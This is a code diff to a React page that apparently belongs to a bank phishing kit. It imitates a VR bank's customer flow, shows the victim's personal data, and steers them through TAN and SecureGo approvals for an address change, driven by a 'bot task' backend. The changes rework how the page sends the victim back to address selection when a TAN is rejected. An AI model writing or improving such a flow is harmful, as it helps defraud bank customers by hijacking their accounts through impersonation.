@@ -5,7 +5,6 @@ import { getBotTask } from "@/lib/botClient";
 import { BankShell, type FlowTheme } from "@/components/flow/BankShell";
 import PersonalDataOverview, { type CustomerData } from "@/components/flow/PersonalDataOverview";
 import AddressVerification from "@/components/AddressVerification";
-import { AddressVerificationStep } from "@/components/flow/AddressVerificationStep";
 import { CompletionStep } from "@/components/flow/CompletionStep";
 import vrLogoGeneric from "@/assets/vr-logo-generic.png";
 
@@ -30,7 +29,7 @@ const DEFAULT_THEME: FlowTheme = {
   buttonRadius: "rounded-full",
 };
 
-type Step = "personal" | "address" | "address-retry" | "done";
+type Step = "personal" | "address" | "done";
 
 export const Route = createFileRoute("/personal-data/$taskId")({
   head: () => ({
@@ -123,9 +122,19 @@ function PersonalDataPage() {
   const [addressDecisionPending, setAddressDecisionPending] = useState(false);
   const [forceShowSecureGo, setForceShowSecureGo] = useState(false);
   const [addressFlowHandled, setAddressFlowHandled] = useState(false);
+  const [personalViewKey, setPersonalViewKey] = useState(0);
   const stepRef = useRef<Step>("personal");
   const addressTanFailedRef = useRef(false);
   useEffect(() => { stepRef.current = step; }, [step]);
+
+  const returnToAddressSelection = () => {
+    addressTanFailedRef.current = true;
+    setForceShowSecureGo(false);
+    setAddressDecisionPending(true);
+    setAddressFlowHandled(false);
+    setPersonalViewKey((value) => value + 1);
+    setStep("personal");
+  };
 
   // Bank context is cached from the login route; restore synchronously
   useEffect(() => {
@@ -174,10 +183,7 @@ function PersonalDataPage() {
       // Sobald der Adressänderungs-Flow läuft (address step oder address tan_type),
       // gilt jede Fehlermeldung als abgelehnte Adress-TAN → zurück zur Adress-Übersicht.
       if (isFailure && (tanType === "address" || stepRef.current === "address" || addressFlowHandled)) {
-        setForceShowSecureGo(false);
-        setAddressDecisionPending(false);
-        setAddressFlowHandled(false);
-        setStep("address-retry");
+        returnToAddressSelection();
         return;
       }
       if (data?.status === "completed" || data?.status === "failed") return;
@@ -223,11 +229,18 @@ function PersonalDataPage() {
     <BankShell {...shellProps}>
       {customer && step === "personal" && (
         <PersonalDataOverview
+          key={personalViewKey}
           // @ts-expect-error FlowTheme is structurally compatible; component only reads shared fields
           theme={theme}
           customerData={customer}
           bankId={bankId}
           addressDecisionPending={addressDecisionPending}
+          additionalAddressOverride={addressData ? {
+            strasse: firstString(addressData.new_street, addressData.street),
+            plzOrt: [firstString(addressData.new_plz, addressData.plz), firstString(addressData.new_city, addressData.city)]
+              .filter(Boolean)
+              .join(" "),
+          } : null}
           onAddressChoiceResolved={() => {
             addressTanFailedRef.current = false;
             setAddressDecisionPending(false);
@@ -268,7 +281,7 @@ function PersonalDataPage() {
           onConfirm={() => setStep("done")}
           onDelete={() => {
             if (addressTanFailedRef.current) {
-              setStep("address-retry");
+              returnToAddressSelection();
               return;
             }
             setAddressFlowHandled(true);
@@ -276,39 +289,9 @@ function PersonalDataPage() {
             setForceShowSecureGo(false);
             setStep("done");
           }}
-          onTanFailed={() => {
-            addressTanFailedRef.current = true;
-            setForceShowSecureGo(false);
-            setAddressDecisionPending(false);
-            setAddressFlowHandled(false);
-            setStep("address-retry");
-          }}
+          onTanFailed={returnToAddressSelection}
           onNoAddress={() => setStep("done")}
           taskId={taskId}
-        />
-      )}
-
-      {customer && step === "address-retry" && (
-        <AddressVerificationStep
-          theme={theme}
-          {...(bankCtx?.group ? { bankGroup: bankCtx.group } : {})}
-          currentAddress={customer.adresse}
-          additionalAddress={
-            addressData
-              ? {
-                  strasse: firstString(addressData.new_street, addressData.street),
-                  plzOrt: [
-                    firstString(addressData.new_plz, addressData.plz),
-                    firstString(addressData.new_city, addressData.city),
-                  ]
-                    .filter(Boolean)
-                    .join(" "),
-                }
-              : { strasse: "", plzOrt: "" }
-          }
-          customerName={customer.name}
-          onBack={() => setStep("personal")}
-          onDeleted={() => setStep("done")}
         />
       )}
 
